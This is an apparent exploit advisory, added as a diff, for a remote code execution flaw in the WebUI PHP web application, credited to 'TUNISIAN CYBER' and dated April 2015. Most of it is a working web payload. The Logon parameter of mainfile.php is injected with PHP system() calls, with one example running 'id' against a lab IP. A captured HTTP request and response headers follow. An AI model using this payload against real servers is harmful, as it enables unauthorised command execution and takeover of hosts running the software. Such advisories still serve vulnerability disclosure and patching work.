@@ -1,0 +1,34 @@
+#[+] Author: TUNISIAN CYBER
+#[+] Title:  WebUI Remote Code Execution Vulnerability
+#[+] Date: 21-04-2015
+#[+] Vendor: https://github.com/baram01/webui/
+#[+] Type: WebAPP
+#[+] Tested on: KaliLinux (Debian)
+#[+] Twitter: @TCYB3R
+#[+] Proof of concept: http://i.imgur.com/co9Qx0n.png
+-------------------------------------------------------------------------------
+p0c:
+
+http://site/webui/mainfile.php?username=USER&password=PASSWORD&_login=1&Logon=';echo system('command');'
+
+Live HTTP Header:
+http://192.168.186.129/webui/mainfile.php?username=RCE&password=RCE&_login=1&Logon=%27;echo%20system(%27id%27);%27
+
+GET /webui/mainfile.php?username=RCE&password=RCE&_login=1&Logon=%27;echo%20system(%27id%27);%27 HTTP/1.1
+Host: 192.168.186.129
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.5.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Date: Wed, 22 Apr 2015 13:20:23 GMT
+Server: Apache/2.2.22 (Debian)
+X-Powered-By: PHP/5.4.39-0+deb7u2
+Content-Encoding: gzip
+Vary: Accept-Encoding
+Content-Length: 51
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
